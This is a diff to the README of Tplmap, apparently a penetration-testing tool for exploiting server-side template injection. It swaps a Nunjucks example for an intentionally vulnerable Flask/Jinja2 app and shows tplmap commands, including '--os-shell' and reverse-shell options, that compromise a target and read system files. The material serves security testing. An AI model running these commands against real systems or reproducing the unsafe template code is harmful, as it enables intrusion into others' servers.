@@ -12,34 +12,35 @@ It achieves full compromise in rendered context, several code context and blind 
 Server-Side Template Injection
 ------------------------------
 
-Assume that you are auditing a web application that uses user-provided values as template to generate a dynamic web page. This example in JavaScript uses [Nunjucks][5] template engine in an unsafe way.
+Assume that you are auditing a web site that generates dynamic pages using templates composed with user-provided values, such as this web application written in Python and [Flask][6] that uses [Jinja2][5] template engine in an unsafe way.
 
-```javascript
-var connect = require('connect');
-var http = require('http');
-var url = require('url');
-var nunjucks = require('nunjucks');
+```python
+from flask import Flask, request
+from jinja2 import Environment
 
-var app = connect();
-app.use('/page', function(req, res){
-  if(req.url) {
-    var url_parts = url.parse(req.url, true);
-    var name = url_parts.query.name;
+app = Flask(__name__)
+Jinja2 = Environment()
+
+@app.route("/page")
+def page():
+
+    name = request.values.get('name')
     
-    // SSTI VULNERABILITY
-    // The user controllable `name` GET parameter 
-    // is concatenated to the template string instead 
-    // of being passed as `context` argument. 
-    rendered = nunjucks.renderString(
-      str = 'Hello ' + name + '!'
-    );
+    # SSTI VULNERABILITY
     
-    res.end(rendered);
-  }
-});
+    # The user-controllable GET parameter `name` is
+    # concatenated to the template string instead of
+    # being passed as context to the `render()` method. 
+    
+    output = Jinja2.from_string('Hello ' + name + '!').render()
+
+    return output
+
+if __name__ == "__main__":
+    app.run(host='0.0.0.0', port=80)
 ```
 
-The page reflects the `name` parameter value, and discloses its SSTI nature when returns basic operation results computed at runtime.
+From a black box testing perspective, the page reflects the value similarly to a XXS vulnerability, but also computes basic operation at runtime disclosing its SSTI nature.
 
 ```
 $ curl -g 'http://www.target.com/page?name=John'
@@ -51,51 +52,50 @@ Hello 49!
 Exploitation
 ------------
 
-Tplmap supports the detection and exploitation of SSTI to get access to the underlying file system and operating system.
+Tplmap is able to detect and exploit SSTI in a range of template engine, including Jinja2, to get access to the underlying file system and operating system. Run it against the URL to test if the parameters are vulnerable.
 
 ```
 $ ./tplmap.py -u 'http://www.target.com/page?name=John'
-[+] Tplmap 0.2
+[+] Tplmap 0.3
     Automatic Server-Side Template Injection Detection and Exploitation Tool
 
 [+] Testing if GET parameter 'name' is injectable
 [+] Smarty plugin is testing rendering with tag '{*}'
 [+] Mako plugin is testing rendering with tag '${*}'
-[+] Jinja2 plugin is testing rendering with tag '{{*}}'
 ...
-[+] Nunjucks plugin is testing rendering with tag '{{*}}'
-[+] Nunjucks plugin has confirmed injection with tag '{{*}}'
+[+] Jinja2 plugin is testing rendering with tag '{{*}}'
+[+] Jinja2 plugin has confirmed injection with tag '{{*}}'
 [+] Tplmap identified the following injection point:
 
   GET parameter: name
-  Engine: Nunjucks
+  Engine: Jinja2
   Injection: {{*}}
   Context: text
   OS: linux
   Technique: render
   Capabilities:
 
-   Shell command execution: yes 
-   Bind and reverse shell: yes 
-   File write: yes 
-   File read: yes 
-   Code evaluation: yes, javascript code
+   Shell command execution: yes
+   Bind and reverse shell: yes
+   File write: yes
+   File read: yes
+   Code evaluation: yes, python code
 
 [+] Rerun tplmap providing one of the following options:
 
-   --os-shell                 Run shell on the target
-   --os-cmd                   Execute shell commands
-   --bind-shell PORT          Connect to a shell bind to a target port
-   --reverse-shell HOST PORT  Send a shell back to the attacker's port
-   --upload LOCAL REMOTE      Upload files to the server
-   --download REMOTE LOCAL    Download remote files
+    --os-shell                Run shell on the target
+    --os-cmd                  Execute shell commands
+    --bind-shell PORT         Connect to a shell bind to a target port
+    --reverse-shell HOST PORT Send a shell back to the attacker's port
+    --upload LOCAL REMOTE     Upload files to the server
+    --download REMOTE LOCAL   Download remote files
 ```
 
 Use `--os-shell` option to compromise the target in a fully automated way.
 
 ```
 $ ./tplmap.py --os-shell -u 'http://www.target.com/page?name=John'
-[+] Tplmap 0.2
+[+] Tplmap 0.3
     Automatic Server-Side Template Injection Detection and Exploitation Tool
 
 [+] Run commands on the operating system.
@@ -111,7 +111,7 @@ bin:x:2:2:bin:/bin:/bin/sh
 Supported template engines
 --------------------------
 
-Tplmap can exploit SSTI vulnerabilities in over 15 template engines, unsandboxed engines and generic _eval()_-like injections. Blind injections and injections in code contexts are supported.
+Tplmap can exploit SSTI vulnerabilities in over 15 template engines, unsandboxed template engines and generic _eval()_-like injections. Blind injections and injections in code contexts are also supported.
 
 | Template engine    | Remote Command Execution |  Blind | Code evaluation | File read | File write |
 |----------------------|-------|-------------------|-----------------|-----------|------------|
@@ -136,4 +136,5 @@ Tplmap can exploit SSTI vulnerabilities in over 15 template engines, unsandboxed
 [2]: https://github.com/epinna/tplmap/issues/9
 [3]: http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine
 [4]: https://artsploit.blogspot.co.uk/2016/08/pprce2.html
-[5]: https://mozilla.github.io/nunjucks/
+[5]: http://jinja.pocoo.org/
+[6]: http://flask.pocoo.org/
